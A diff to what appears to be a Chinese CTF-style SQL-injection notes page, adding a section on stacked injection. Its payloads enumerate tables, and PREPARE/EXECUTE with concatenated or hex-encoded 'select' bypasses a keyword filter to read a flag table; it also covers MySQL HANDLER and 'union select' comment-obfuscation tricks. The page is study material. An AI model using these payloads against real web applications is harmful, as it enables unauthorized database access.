@@ -358,6 +358,33 @@ select + 列名(* 代表所有) from + 查询表 + where + 查询内容
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: Chunked</span><br></pre></td></tr></table></figure>
 
 <p>随后使用<code>BurpSuit</code>的相关插件即可完成对应的传输</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>当我们存在有<code>select</code>过滤时，我们大部分的注入方式都失效了，我们此时可以考虑堆叠注入的方式来进行</p>
+<p>我们使用<code>show</code>来查看表名和列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from tableName;#</span><br><span class="line">--- 或者 --- </span><br><span class="line">1&#x27;;desc tableName;#</span><br></pre></td></tr></table></figure>
+
+<p>注意，如果<code>tableName</code>是纯数字，需要用 ` 包裹，比如 1’;desc `1919810931114514`;#</p>
+<p>当我们找到对应的<code>flag</code>位置后，可以采用预编译的方式拼接<code>select</code>进而绕过对其的过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+
+<p>或者将select * from `1919810931114514` 替换为其16进制的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>预编译</strong></p>
+<p>预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
+<p>格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
+
+<p>举例：查询ID为1的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE jia;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="更改表名"><a href="#更改表名" class="headerlink" title="更改表名"></a>更改表名</h3><ul>
+<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code></li>
+<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code></li>
+</ul>
+<h3 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h3><p>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
+
 <h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="万能符号"><a href="#万能符号" class="headerlink" title="万能符号"></a>万能符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select  --&gt; union/*//--/*/select</span><br><span class="line">union select 1,2,3  --&gt; union /*!--+/*%0aselect/*!1,2,*/ 3</span><br></pre></td></tr></table></figure>
 
 <h4 id="过滤-substr-和-mid-等"><a href="#过滤-substr-和-mid-等" class="headerlink" title="过滤 substr() 和 mid() 等"></a>过滤 substr() 和 mid() 等</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left() 、 right() 、 mid() 、 substr() 、 substring() 、 lpad() 、 rpad() 等价</span><br></pre></td></tr></table></figure>
